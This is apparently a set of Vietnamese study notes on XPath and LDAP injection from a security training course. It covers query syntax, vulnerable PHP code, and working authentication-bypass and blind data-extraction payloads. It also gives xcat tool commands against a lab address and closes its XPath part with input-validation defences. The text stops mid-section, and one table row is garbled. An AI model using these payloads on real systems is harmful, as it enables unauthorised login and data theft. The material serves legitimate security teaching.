1. Giới thiệu về tấn công Injection
Lỗ hổng injection là một trong những vấn đề bảo mật phổ biến nhất và luôn nằm trong danh sách OWASP Top Ten kể từ lần phát hành đầu tiên vào năm 2003. Các dạng tấn công injection được biết đến rộng rãi bao gồm:

SQL Injection
Command Injection
Cross-Site Scripting (XSS)

2. Các loại tấn công Injection phổ biến
2.1. XPath Injection
Giới thiệu: XPath là ngôn ngữ truy vấn dữ liệu cho tài liệu XML, tương tự như SQL cho cơ sở dữ liệu.
Vấn đề bảo mật: Lỗ hổng xảy ra khi dữ liệu đầu vào của người dùng được đưa trực tiếp vào truy vấn XPath mà không được kiểm tra. Điều này cho phép kẻ tấn công truy vấn và truy xuất toàn bộ tài liệu XML, gây nguy hiểm cho dữ liệu của ứng dụng.
2.2. LDAP Injection
Giới thiệu: LDAP (Lightweight Directory Access Protocol) là giao thức truy cập các máy chủ thư mục như Active Directory (AD).
Vấn đề bảo mật: Lỗ hổng LDAP Injection xuất hiện khi dữ liệu đầu vào của người dùng được đưa vào bộ lọc tìm kiếm LDAP mà không được kiểm tra. Điều này có thể dẫn đến:
Bypass xác thực: Kẻ tấn công có thể vượt qua cơ chế xác thực nếu truy vấn LDAP được triển khai sai.
Mất dữ liệu: Kẻ tấn công có thể truy xuất hoặc thay đổi dữ liệu trong máy chủ thư mục.
2.3. HTML Injection trong PDF Generators
Giới thiệu: PDF là định dạng tài liệu phổ biến được sử dụng để phân phối thông tin. Nhiều ứng dụng web có tính năng chuyển đổi dữ liệu sang định dạng PDF bằng cách sử dụng các thư viện tạo PDF.
Vấn đề bảo mật: Dữ liệu đầu vào của người dùng thường được đưa trực tiếp vào tài liệu PDF mà không được kiểm tra. Điều này có thể dẫn đến lỗ hổng HTML Injection, gây ra các rủi ro như:
Server-Side Request Forgery (SSRF): Kẻ tấn công có thể ép máy chủ gửi yêu cầu HTTP đến một địa chỉ tùy ý.
Local File Inclusion (LFI): Kẻ tấn công có thể bao gồm các tệp cục bộ vào tài liệu PDF, dẫn đến rò rỉ thông tin hệ thống.

3. Giới thiệu về XPath Injection
3.1. XPath là gì?
XPath (XML Path Language) là một ngôn ngữ truy vấn dữ liệu XML, tương tự như SQL cho cơ sở dữ liệu. XPath được sử dụng để truy vấn và trích xuất dữ liệu từ các tài liệu XML.
Lỗ hổng XPath Injection xảy ra khi đầu vào của người dùng được đưa vào truy vấn XPath mà không được kiểm tra và làm sạch, tương tự như lỗ hổng SQL Injection. Điều này có thể cho phép kẻ tấn công truy xuất toàn bộ tài liệu XML.
3.2. Cấu trúc và thuật ngữ của XPath
XML Declaration: Tài liệu XML bắt đầu bằng khai báo XML, ví dụ: <?xml version="1.0" encoding="UTF-8"?>.
Root Node: Là phần tử gốc của tài liệu XML, ví dụ: <academy_modules>.
Element Node: Các phần tử như <module>, <title>.
Attribute Node: Các thuộc tính như co-author="LTNB0B", difficulty="medium".
Comment Node: Chứa các chú thích, ví dụ: <!-- this is a comment -->.
Text Node: Chứa dữ liệu văn bản, ví dụ: Web Attacks, LTNB0B.
3.3. Truy vấn cơ bản với XPath
Mỗi truy vấn XPath sẽ chọn một tập hợp các node từ tài liệu XML, và bắt đầu từ một context node (điểm khởi đầu).
Ví dụ truy vấn cơ bản:
module: Chọn tất cả các node con module từ context node.
/: Chọn root node của tài liệu.
//: Chọn tất cả các node con từ context node.
.: Chọn context node hiện tại.
..: Chọn parent node của context node hiện tại.
@difficulty: Chọn node thuộc tính difficulty.
text(): Chọn tất cả các node văn bản con.
3.4. Predicates trong XPath
Predicates là bộ lọc cho kết quả truy vấn, tương tự như mệnh đề WHERE trong SQL. Các bộ lọc được chứa trong dấu ngoặc vuông [].
Ví dụ:
/academy_modules/module[1]: Chọn module con đầu tiên của academy_modules.
/academy_modules/module[last()]: Chọn module con cuối cùng của academy_modules.
//module[tier=2]/title: Chọn title của tất cả các module có tier bằng 2.
3.5. Wildcards và Union trong XPath
Wildcards được sử dụng khi không quan tâm đến loại node:
node(): Khớp với bất kỳ node nào.
*: Khớp với bất kỳ element node nào.
@*: Khớp với bất kỳ attribute node nào.
Union: Kết hợp nhiều truy vấn XPath với toán tử |.
Ví dụ: //module[tier=2]/title/text() | //module[tier=3]/title/text(): Chọn text() của tất cả các title từ module có tier bằng 2 hoặc 3.
3.6. Toán tử hỗ trợ trong Predicates
Các toán tử hỗ trợ trong XPath:
+: Phép cộng
-: Phép trừ
*: Phép nhân
div: Phép chia
=: Bằng
!=: Khác
<, <=: Nhỏ hơn, nhỏ hơn hoặc bằng
>, >=: Lớn hơn, lớn hơn hoặc bằng
or: Hoặc logic
and: Và logic
mod: Phép chia lấy dư
Tóm tắt
XPath Injection là một dạng tấn công phổ biến khi dữ liệu đầu vào không được kiểm tra, cho phép kẻ tấn công khai thác và truy vấn dữ liệu XML một cách bất hợp pháp. Để khai thác hiệu quả, kẻ tấn công có thể sử dụng các wildcard, predicates, và toán tử trong XPath để trích xuất dữ liệu từ tài liệu XML, gây rò rỉ thông tin nhạy cảm.

4. Bypass xác thực với XPath Injection
4.1. Tổng quan về XPath Injection để bypass xác thực
XPath Injection tương tự như SQL Injection, có thể được sử dụng để vượt qua cơ chế xác thực của ứng dụng web.
Các truy vấn XPath thường được sử dụng để kiểm tra tên đăng nhập và mật khẩu từ tài liệu XML. Nếu đầu vào của người dùng không được kiểm tra kỹ lưỡng, kẻ tấn công có thể chèn các payload để bypass xác thực.
4.2. Ví dụ về xác thực với truy vấn XPath
Ví dụ tài liệu XML chứa thông tin người dùng:

xml
Sao chép mã
<users>
  <user>
    <name first="Kaylie" last="Grenvile"/>
    <id>1</id>
    <username>kgrenvile</username>
    <password>P@ssw0rd!</password>
  </user>
  <user>
    <name first="Admin" last="Admin"/>
    <id>2</id>
    <username>admin</username>
    <password>admin</password>
  </user>
  <user>
    <name first="Academy" last="Student"/>
    <id>3</id>
    <username>htb-stdnt</username>
    <password>Academy_student!</password>
  </user>
</users>
Truy vấn XPath xác thực:

php
Sao chép mã
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
4.3. Payload bypass xác thực cơ bản
Kẻ tấn công có thể chèn đầu vào như: ' or '1'='1 để làm cho truy vấn luôn trả về true.
Truy vấn sau khi chèn payload:
xpath
Sao chép mã
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
Truy vấn này sẽ trả về tất cả các node user, cho phép kẻ tấn công đăng nhập dưới tài khoản đầu tiên (kgrenvile).
4.4. Bypass xác thực với người dùng cụ thể
Để đăng nhập dưới tài khoản admin, kẻ tấn công có thể sử dụng payload: admin' or '1'='1.
Truy vấn XPath:
xpath
Sao chép mã
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
Với toán tử or, truy vấn sẽ trả về node người dùng admin mà không cần mật khẩu chính xác.
4.5. Khai thác nâng cao khi mật khẩu được hash
Trong thực tế, mật khẩu thường được hash trước khi đưa vào truy vấn:

php
Sao chép mã
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
Payload như ' or '1'='1 sẽ không hoạt động vì mật khẩu đã được hash.

4.6. Payload bypass với or true()
Kẻ tấn công có thể sử dụng payload: ' or true() or '.
Truy vấn XPath:
xpath
Sao chép mã
/users/user[username/text()='' or true() or '' and password/text()='hashed_password']
Toán tử or true() làm cho truy vấn luôn trả về true, vượt qua xác thực.
4.7. Sử dụng vị trí để tìm người dùng cụ thể
Kẻ tấn công có thể lặp qua các người dùng bằng cách sử dụng position().
Payload ví dụ: ' or position()=2 or '
Truy vấn XPath:
xpath
Sao chép mã
/users/user[username/text()='' or position()=2 or '' and password/text()='hashed_password']
Truy vấn này trả về node người dùng thứ hai. Kẻ tấn công có thể tăng giá trị position() để tìm người dùng mong muốn.
4.8. Tìm kiếm người dùng theo chuỗi con
Nếu biết một phần tên đăng nhập, kẻ tấn công có thể sử dụng hàm contains().
Payload ví dụ: ' or contains(.,'admin') or '
Truy vấn XPath:
xpath
Sao chép mã
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='hashed_password']
Truy vấn này trả về tất cả các node user chứa chuỗi con "admin" trong tên đăng nhập.
Tóm tắt
XPath Injection có thể được khai thác để vượt qua cơ chế xác thực bằng cách chèn các payload hợp lý, đặc biệt khi đầu vào không được kiểm tra và làm sạch. Các phương pháp bao gồm sử dụng or true(), position(), và contains(), giúp kẻ tấn công truy cập trái phép vào hệ thống mà không cần mật khẩu hợp lệ.

5. Trích xuất dữ liệu (Data Exfiltration) qua XPath Injection
5.1. Tổng quan về trích xuất dữ liệu
Sau khi đã bypass xác thực thông qua XPath Injection, kẻ tấn công có thể tiếp tục khai thác để trích xuất dữ liệu từ tài liệu XML.
Các kỹ thuật trích xuất dữ liệu tương tự như khai thác dựa trên UNION trong SQL Injection, giúp kẻ tấn công truy vấn dữ liệu tùy ý từ tài liệu XML.
5.2. Xác nhận lỗ hổng XPath Injection
Để xác nhận lỗ hổng, có thể thử gửi payload sau:
Payload: SOMETHINGINVALID') or ('1'='1
Truy vấn XPath sau khi chèn payload:
xpath
Sao chép mã
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]
Ở đây, mặc dù chuỗi tìm kiếm "SOMETHINGINVALID" là không hợp lệ, nhưng toán tử or ('1'='1') sẽ làm cho truy vấn luôn trả về true, dẫn đến việc chọn tất cả các node ở mức đó. Kết quả là ứng dụng web sẽ trả về tất cả các giá trị tìm thấy, xác nhận rằng lỗ hổng XPath Injection tồn tại.
5.3. Kỹ thuật trích xuất dữ liệu từ tài liệu XML
Cách đơn giản nhất để trích xuất toàn bộ dữ liệu là tạo truy vấn trả về tất cả các node văn bản trong tài liệu.
Ví dụ payload: | //text()
Truy vấn XPath sau khi chèn payload:
xpath
Sao chép mã
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
Giải thích:
Payload sử dụng toán tử | (tương tự như UNION trong SQL) để thêm một truy vấn mới.
Truy vấn ../../..//text() sẽ di chuyển ngược lên root của tài liệu và chọn tất cả các node văn bản.
5.4. Trích xuất toàn bộ tài liệu XML
Sử dụng payload: SOMETHINGINVALID') or ('1'='1 và đặt giá trị tham số f là ../../..//text().
Truy vấn XPath kết quả:
xpath
Sao chép mã
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
Giải thích:
Toán tử or ('1'='1') làm cho điều kiện luôn đúng, giúp truy vấn chọn tất cả các node văn bản từ root của tài liệu.
Kết quả là toàn bộ nội dung văn bản của tài liệu XML sẽ được trả về, cho phép kẻ tấn công trích xuất dữ liệu một cách dễ dàng.
Tóm tắt
Kỹ thuật XPath Injection có thể được sử dụng để khai thác không chỉ để bypass xác thực mà còn để trích xuất dữ liệu từ tài liệu XML. Bằng cách sử dụng các toán tử như or và |, kẻ tấn công có thể thực hiện truy vấn trả về toàn bộ nội dung văn bản của tài liệu, tương tự như khai thác UNION-based trong SQL Injection.

6. Khai thác nâng cao để trích xuất dữ liệu (Advanced Data Exfiltration)
6.1. Thách thức khi trích xuất dữ liệu
Trong một số trường hợp, ứng dụng web chỉ hiển thị số lượng kết quả giới hạn (ví dụ: chỉ 5 kết quả đầu tiên). Điều này khiến cho việc trích xuất toàn bộ tài liệu XML trong một lần trở nên không khả thi.
Để trích xuất tất cả dữ liệu, chúng ta cần duyệt qua từng phần của tài liệu XML và thực hiện truy vấn lặp lại để lấy được toàn bộ dữ liệu.
6.2. Xác định độ sâu của tài liệu XML
Để bắt đầu, chúng ta cần xác định độ sâu của schema XML. Điều này có thể được thực hiện bằng cách thử truy vấn với các payload mà không trả về kết quả nào, sau đó thêm các truy vấn phụ để tìm hiểu cấu trúc schema.
Ví dụ payload:
Tham số q: SOMETHINGINVALID
Tham số f: fullstreetname | /*[1]
Truy vấn XPath:
xpath
Sao chép mã
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
Giải thích:
Truy vấn phụ /*[1] bắt đầu từ root node /, di chuyển xuống một node con đầu tiên và chọn node con đó.
Nếu node root chứa nhiều node con, kết quả sẽ là một mảng (array), khiến ứng dụng web không thể hiển thị kết quả, dẫn đến phản hồi trống.
6.3. Xác định độ sâu schema qua truy vấn lặp lại
Chúng ta có thể tiếp tục thêm /*[1] vào truy vấn phụ và quan sát thay đổi trong phản hồi của ứng dụng web. Kết quả có thể như sau:
f = fullstreetname /*[1] → Kết quả trống
f = fullstreetname /[1]/[1] → Kết quả trống
f = fullstreetname /[1]/[1]/*[1] → Kết quả trống
f = fullstreetname /[1]/[1]/[1]/[1] → Kết quả trống
f = fullstreetname /[1]/[1]/[1]/[1]/*[1] → Có kết quả
Kết luận: Độ sâu của dữ liệu là 4.
6.4. Trích xuất dữ liệu thông qua lặp lại vị trí
Sau khi xác định độ sâu schema, chúng ta có thể tăng dần chỉ số vị trí trong truy vấn để trích xuất từng phần dữ liệu.
Ví dụ payload:
xpath
Sao chép mã
/[1]/[1]/[1]/[1]
/[1]/[1]/[1]/[2]
/[1]/[1]/[1]/[3]
/[1]/[1]/[1]/[4]
Giải thích:
Truy vấn này sẽ trích xuất thông tin về các node con, ví dụ: tên đầy đủ của đường, tên viết tắt, và loại đường.
6.5. Trích xuất dữ liệu từ các tập dữ liệu khác
Sau khi trích xuất xong thông tin về đường phố, chúng ta có thể tìm kiếm các tập dữ liệu khác bằng cách thay đổi chỉ số vị trí.
Ví dụ tài liệu XML khác:
xml
Sao chép mã
<dataset>
  <streets>
    <street>
      <fullstreetname>01ST ST</fullstreetname>
      <streetname>01ST</streetname>
      <street_type>ST</street_type>
    </street>
  </streets>
  <users>
    <group name="users">
      <user>
        <username>test</username>
        <password>test</password>
      </user>
    </group>
    <group name="admins">
      <user>
        <username>admin</username>
        <password>admin</password>
      </user>
    </group>
  </users>
</dataset>
Trong tài liệu này, các node street nằm ở độ sâu 3, trong khi các node user nằm ở độ sâu 4. Chúng ta cần xác định độ sâu mới khi chuyển sang trích xuất thông tin người dùng.
6.6. Trích xuất thông tin người dùng
Để trích xuất dữ liệu người dùng, chúng ta có thể sử dụng truy vấn:
xpath
Sao chép mã
/[1]/[2]/[1]/[1]/*[1]
/[1]/[2]/[1]/[1]/*[2]
/[1]/[2]/[1]/[1]/*[3]
/[1]/[2]/[1]/[1]/*[4]
Kết quả: Chúng ta có thể trích xuất thông tin như tên người dùng, mật khẩu hash, và mô tả.
6.7. Lưu ý khi khai thác tự động
Để trích xuất toàn bộ tài liệu XML, nên sử dụng một script tự động để duyệt qua các chỉ số vị trí và trích xuất dữ liệu một cách hiệu quả.
Việc thực hiện thủ công có thể không khả thi đối với các tài liệu XML lớn hoặc có cấu trúc phức tạp.
Tóm tắt
Kỹ thuật trích xuất nâng cao trong XPath Injection giúp vượt qua giới hạn về số lượng kết quả trả về. Bằng cách xác định độ sâu schema và sử dụng các truy vấn lặp lại, kẻ tấn công có thể trích xuất toàn bộ nội dung tài liệu XML một cách hiệu quả.


7. Khai thác Blind XPath Injection
7.1. Tổng quan về Blind XPath Injection
Khi ứng dụng web không hiển thị kết quả của truy vấn XPath, vẫn có thể khai thác lỗ hổng này bằng cách sử dụng kỹ thuật tương tự như Blind SQL Injection.
XPath không hỗ trợ hàm sleep(), vì vậy chúng ta cần một chỉ báo (indicator) từ ứng dụng web để xác định kết quả của truy vấn. Điều này cho phép trích xuất dữ liệu dựa trên thông tin nhị phân.
7.2. Phương pháp khai thác
Kỹ thuật khai thác này dựa trên các hàm sau:

name(): Trả về tên của node.
substring(): Trích xuất từng ký tự trong tên node.
string-length(): Xác định độ dài của tên node.
count(): Trả về số lượng node con.
Mục tiêu là trích xuất thông tin cấu trúc XML trước, sau đó là dữ liệu cần thiết.

7.3. Xác nhận lỗ hổng XPath Injection
Để xác nhận lỗ hổng, có thể thử cung cấp payload: invalid' or '1'='1.
Truy vấn XPath kết quả:
xpath
Sao chép mã
/users/user[username='invalid' or '1'='1']
Nếu ứng dụng phản hồi như khi cung cấp tên người dùng hợp lệ, thì lỗ hổng XPath Injection tồn tại.
7.4. Trích xuất độ dài tên node
Để trích xuất độ dài tên của node gốc, có thể sử dụng payload:
xpath
Sao chép mã
invalid' or string-length(name(/*[1]))=1 and '1'='1
Giải thích:
/*[1] chọn node gốc.
Nếu truy vấn không trả về kết quả, cần tăng giá trị độ dài cho đến khi tìm được độ dài chính xác.
Ví dụ: Độ dài tên của node gốc là 5.
7.5. Trích xuất tên của node
Sau khi biết độ dài tên node, chúng ta có thể trích xuất từng ký tự bằng cách sử dụng hàm substring().
Payload ví dụ:
xpath
Sao chép mã
invalid' or substring(name(/*[1]),1,1)='a' and '1'='1
Giải thích:
Payload này kiểm tra xem ký tự đầu tiên của tên node có phải là 'a' hay không.
Lặp qua tất cả các ký tự cho đến khi trích xuất được toàn bộ tên, ví dụ: users.
7.6. Trích xuất số lượng node con
Để xác định số lượng node con, sử dụng hàm count():
xpath
Sao chép mã
invalid' or count(/users/*)=1 and '1'='1
Giải thích:
Truy vấn này trả về dữ liệu nếu số lượng node con là 1. Tăng giá trị cho đến khi tìm được số lượng chính xác.
7.7. Trích xuất dữ liệu từ node con
Sau khi xác định cấu trúc schema, chúng ta có thể trích xuất dữ liệu từ các node con.
Payload ví dụ để trích xuất độ dài tên người dùng:
xpath
Sao chép mã
invalid' or string-length(/users/user[1]/username)=1 and '1'='1
Payload để trích xuất từng ký tự:
xpath
Sao chép mã
invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1
Giải thích:
Lặp qua từng ký tự cho đến khi trích xuất được toàn bộ tên người dùng, ví dụ: admin.
7.8. Khai thác dựa trên thời gian xử lý (Time-based Exploitation)
XPath không có hàm sleep(), nhưng có thể tạo sự khác biệt về thời gian xử lý để xác định kết quả của truy vấn.
Payload ví dụ:
xpath
Sao chép mã
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
Giải thích:
Nếu điều kiện substring(/users/user[1]/username,1,1)='a' là true, phần thứ hai của điều kiện and sẽ được đánh giá.
count((//.)[count((//.))]) yêu cầu ứng dụng duyệt qua toàn bộ tài liệu XML, dẫn đến thời gian xử lý dài hơn đáng kể.
Điều này tạo ra sự khác biệt về thời gian xử lý, cho phép xác định kết quả của truy vấn.
7.9. Lưu ý khi khai thác dựa trên thời gian
Đối với các tài liệu XML lớn, payload có thể gây quá tải máy chủ và dẫn đến tấn công từ chối dịch vụ (DoS).
Cần cẩn thận khi sử dụng kỹ thuật này, đặc biệt trong môi trường thực tế.
Tóm tắt
Blind XPath Injection có thể khai thác bằng cách sử dụng các hàm như name(), substring(), và count() để trích xuất dữ liệu mà không cần kết quả hiển thị trực tiếp. Kỹ thuật dựa trên thời gian xử lý giúp tạo ra một chỉ báo cho kết quả truy vấn, tương tự như Blind SQL Injection. Việc tự động hóa quá trình khai thác bằng script sẽ giúp tiết kiệm thời gian và tăng hiệu quả khai thác.

8. Phòng chống XPath Injection và công cụ hỗ trợ khai thác
8.1. Công cụ hỗ trợ khai thác XPath Injection
Một trong những công cụ phổ biến để khai thác XPath Injection là xcat, cung cấp nhiều tính năng để hỗ trợ phát hiện và khai thác lỗ hổng.

Cài đặt xcat:

bash
Sao chép mã
pip3 install cython
pip3 install xcat
Lệnh chính của xcat:

detect: Phát hiện lỗ hổng XPath Injection.
injections: Hiển thị tất cả các loại injection mà xcat hỗ trợ.
ip: Hiển thị địa chỉ IP hiện tại.
run: Trích xuất tài liệu XML thông qua khai thác XPath Injection.
shell: Mở shell của xcat để thực hiện các lệnh hệ thống.
Ví dụ sử dụng xcat:

bash
Sao chép mã
xcat detect http://172.17.0.2/index.php q q=BAR f=fullstreetname --true-string='!No Result'
Giải thích:

Tham số q là tham số dễ bị tổn thương.
--true-string='!No Result' chỉ định rằng phản hồi không chứa chuỗi "No Result" khi truy vấn trả về kết quả.
Khai thác Blind XPath Injection:

bash
Sao chép mã
xcat detect http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
Giải thích:

-m POST: Gửi payload dưới dạng POST request.
--true-string=successfully: Phản hồi chứa chuỗi "successfully" khi truy vấn trả về dữ liệu.
Trích xuất toàn bộ tài liệu XML:

bash
Sao chép mã
xcat run http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
8.2. Phòng chống XPath Injection
Không giống như SQL, một số ngôn ngữ lập trình và thư viện không cung cấp prepared statements hoặc stored procedures cho XPath, do đó việc kiểm tra và làm sạch dữ liệu đầu vào là phương pháp phòng chống hiệu quả nhất.

Các phương pháp phòng chống:

Kiểm tra và làm sạch dữ liệu đầu vào:

Tất cả dữ liệu đầu vào từ người dùng phải được coi là không đáng tin cậy.
Kiểm tra dữ liệu đầu vào trước khi đưa vào truy vấn XPath.
Sử dụng whitelist chỉ cho phép các ký tự chữ và số (alphanumeric). Ví dụ:
php
Sao chép mã
if (!preg_match('/^[a-zA-Z0-9]+$/', $_POST['username'])) {
    die("Invalid input!");
}
Xác thực kiểu dữ liệu:

Xác minh kiểu và định dạng dữ liệu đầu vào. Ví dụ: nếu một giá trị phải là số nguyên, kiểm tra dữ liệu chỉ chứa các chữ số:
php
Sao chép mã
if (!ctype_digit($_GET['id'])) {
    die("Invalid ID!");
}
Kiểm tra ngữ nghĩa dữ liệu:

Nếu dữ liệu chỉ có thể thuộc một tập hợp các giá trị cố định, hãy kiểm tra tính hợp lệ của giá trị đó. Ví dụ:
php
Sao chép mã
$valid_options = ['fullstreetname', 'streetname'];
if (!in_array($_GET['f'], $valid_options)) {
    die("Invalid option!");
}
Sử dụng blacklist (chặn các ký tự đặc biệt):

Chặn các ký tự điều khiển trong XPath:
Dấu nháy đơn (')
Dấu nháy kép (")
Dấu gạch chéo (/)
Ký tự @
Ký tự bằng (=)
Ký tự wildcard (*)
Dấu ngoặc vuông ([, ]) và dấu ngoặc đơn ((, ))
Ví dụ blacklist đơn giản:
php
Sao chép mã
$input = str_replace(["'", '"', "/", "@", "=", "*", "[", "]", "(", ")"], "", $_POST['input']);
8.3. Tại sao whitelist tốt hơn blacklist?
Whitelist chỉ cho phép các ký tự an toàn, giúp giảm thiểu khả năng bỏ sót các ký tự nguy hiểm.
Blacklist có thể bỏ sót các ký tự hoặc chuỗi mới mà kẻ tấn công sử dụng để khai thác lỗ hổng.
Tóm tắt
Phòng chống XPath Injection yêu cầu làm sạch dữ liệu đầu vào một cách nghiêm ngặt và sử dụng các biện pháp kiểm tra hợp lệ. Công cụ như xcat có thể giúp phát hiện và khai thác lỗ hổng, nhưng việc áp dụng các phương pháp phòng chống là cần thiết để bảo vệ ứng dụng khỏi các cuộc tấn công này.

9. Giới thiệu về LDAP Injection
9.1. LDAP là gì?
Lightweight Directory Access Protocol (LDAP) là một giao thức dùng để truy cập các máy chủ thư mục như Active Directory (AD). LDAP cho phép các ứng dụng web tích hợp với AD hoặc các dịch vụ thư mục khác để thực hiện xác thực hoặc truy vấn dữ liệu.
Lỗ hổng LDAP Injection xảy ra khi dữ liệu đầu vào của người dùng được chèn vào các truy vấn LDAP mà không qua kiểm tra và làm sạch đúng cách, dẫn đến nguy cơ bị khai thác.
9.2. Thuật ngữ cơ bản trong LDAP
Directory Server (DS): Là máy chủ lưu trữ dữ liệu, tương tự như một máy chủ cơ sở dữ liệu. Ví dụ: OpenLDAP.
LDAP Entry: Chứa dữ liệu cho một thực thể và gồm 3 thành phần chính:
Distinguished Name (DN): Là định danh duy nhất cho mỗi entry, gồm các Relative Distinguished Names (RDNs). Ví dụ: uid=admin,dc=hackthebox,dc=com.
Attributes: Chứa dữ liệu, bao gồm loại thuộc tính và giá trị.
Object Classes: Định nghĩa kiểu đối tượng, ví dụ: Person hoặc Group.
9.3. Các thao tác trong LDAP
Bind Operation: Xác thực client với máy chủ.
Unbind Operation: Đóng kết nối giữa client và máy chủ.
Add Operation: Thêm entry mới.
Delete Operation: Xóa entry.
Modify Operation: Chỉnh sửa entry.
Search Operation: Tìm kiếm các entry phù hợp với truy vấn.
10. Cú pháp truy vấn tìm kiếm LDAP (LDAP Search Filter)
Truy vấn tìm kiếm trong LDAP được gọi là search filters, gồm các thành phần:

Attribute: Thuộc tính cần tìm kiếm.
Operand: Toán tử so sánh.
Value: Giá trị tìm kiếm.
Ví dụ về operand phổ biến:
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Operand	Ví dụ	Mô tả
=	(name=Kaylie)	Khớp với tất cả các entry có thuộc tính name là Kaylie.
>=	(uid>=10)	Khớp với tất cả các entry có thuộc tính uid lớn hơn hoặc bằng 10.
<=	(uid<=10)	Khớp với tất cả các entry có thuộc tính uid nhỏ hơn hoặc bằng 10.
~=	(name~=Kaylie)	Khớp xấp xỉ với giá trị Kaylie.
Toán tử kết hợp trong LDAP Search Filters
Operand	Ví dụ	Mô tả
And &	(&(name=Kaylie)(title=Manager))	Khớp với các entry có name là Kaylie và title là Manager.
Or `	`	`(
Not !	(!(name=Kaylie))	Khớp với các entry có name khác Kaylie.
Ký tự đại diện (Wildcard) trong LDAP
Ví dụ	Mô tả
(name=*)	Khớp với tất cả các entry có thuộc tính name.
(name=K*)	Khớp với tất cả các entry có name bắt đầu bằng chữ "K".
(name=*a*)	Khớp với tất cả các entry có name chứa chữ "a".
11. Các loại thuộc tính phổ biến trong LDAP
Thuộc tính	Mô tả
cn	Tên đầy đủ (Full Name)
givenName	Tên đầu tiên (First Name)
sn	Họ (Last Name)
uid	User ID
objectClass	Loại đối tượng (Object Type)
distinguishedName	Distinguished Name
ou	Đơn vị tổ chức (Organizational Unit)
title	Chức vụ (Title)
telephoneNumber	Số điện thoại
description	Mô tả
mail	Địa chỉ email
userPassword	Mật khẩu người dùng
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
12. Lỗ hổng LDAP Injection
Lỗ hổng xảy ra khi dữ liệu đầu vào của người dùng được chèn trực tiếp vào các truy vấn LDAP mà không qua kiểm tra. Điều này cho phép kẻ tấn công chèn các truy vấn độc hại, tương tự như SQL Injection.

Ví dụ về lỗ hổng LDAP Injection
Code PHP dễ bị tấn công:
php
Sao chép mã
$ldap_filter = "(uid=" . $_POST['username'] . ")";
$result = ldap_search($ldap_conn, $base_dn, $ldap_filter);
Payload tấn công: *)(uid=*))(|(uid=*
Truy vấn LDAP kết quả: ((uid=*)(uid=*))(|(uid=*))
Kẻ tấn công có thể truy vấn tất cả các entry mà không cần tên người dùng hợp lệ.

LDAP Authentication Bypass)

LDAP (Lightweight Directory Access Protocol) thường được sử dụng để xác thực người dùng trong các ứng dụng web, đặc biệt là khi tích hợp với Active Directory (AD). LDAP Injection là một phương pháp tấn công để thay đổi bộ lọc tìm kiếm LDAP nhằm vượt qua quá trình xác thực.

Cấu trúc Bộ Lọc LDAP
Khi ứng dụng web xác thực người dùng, bộ lọc LDAP có thể trông như sau:

ldap
Sao chép mã
(&(uid=admin)(userPassword=password123))
Trong đó:

uid là tên người dùng.
userPassword là mật khẩu.
Lợi dụng LDAP Injection để Bypass Xác thực
1. Dùng Ký Tự Wildcard (*) để Vượt Qua Mật Khẩu
Ký tự * được xem như một ký tự wildcard trong LDAP, có thể được sử dụng để bỏ qua kiểm tra mật khẩu. Ví dụ:

Tên người dùng: admin
Mật khẩu: *
Bộ lọc LDAP sẽ trở thành:

ldap
Sao chép mã
(&(uid=admin)(userPassword=*))
Điều này cho phép người tấn công đăng nhập thành công mà không cần mật khẩu.

2. Dùng Ký Tự Wildcard trong Trường Tên Người Dùng
Nếu không biết tên người dùng hợp lệ, có thể chèn ký tự wildcard vào trường tên người dùng, dẫn đến bộ lọc như sau:

ldap
Sao chép mã
(&(uid=*)(userPassword=*))
Điều này sẽ khớp với mọi mục có cả uid và userPassword, cho phép người tấn công đăng nhập như người dùng đầu tiên trong danh sách.

3. Dùng Substring của Tên Người Dùng
Khi biết một phần tên người dùng hợp lệ (ví dụ: biết "admin" nhưng không biết đầy đủ tên người dùng), người tấn công có thể sử dụng substring. Ví dụ:

ldap
Sao chép mã
(&(uid=admin*)(userPassword=*))
Điều này khớp với mọi mục có uid bắt đầu bằng "admin", giúp bỏ qua các biện pháp ẩn danh và đăng nhập thành công.

4. Bypass Xác Thực mà Không Dùng Wildcard
Trong một số trường hợp, ứng dụng web có thể chặn ký tự wildcard (*). Tuy nhiên, người tấn công vẫn có thể vượt qua xác thực bằng cách thay đổi cấu trúc bộ lọc LDAP. Ví dụ:

Tên người dùng: admin)(|(&
Mật khẩu: abc
Bộ lọc LDAP sẽ trở thành:

ldap
Sao chép mã
(&(uid=admin)(|(&)(userPassword=abc)))
Bằng cách chèn (|(&), bộ lọc chứa một điều kiện OR với một toán tử true ((&)), giúp bỏ qua kiểm tra mật khẩu sai và đăng nhập thành công nếu cung cấp một tên người dùng hợp lệ.

Kết Luận
LDAP Injection có thể là một phương pháp tấn công mạnh mẽ để vượt qua xác thực trong các ứng dụng web sử dụng LDAP. Các cách khai thác chính bao gồm sử dụng wildcard, chèn điều kiện OR, và thay đổi cấu trúc bộ lọc LDAP. Để ngăn chặn các lỗ hổng này, các nhà phát triển cần phải kiểm tra và lọc kỹ lưỡng tất cả các đầu vào người dùng.

Exfiltration Dữ Liệu và Blind Exploitation với LDAP Injection

Trong phần này, chúng ta sẽ tìm hiểu về cách khai thác lỗ hổng LDAP Injection để exfiltrate dữ liệu và thực hiện tấn công blind, tức là khai thác dữ liệu mà không cần phải hiển thị kết quả của truy vấn.

Exfiltration Dữ Liệu
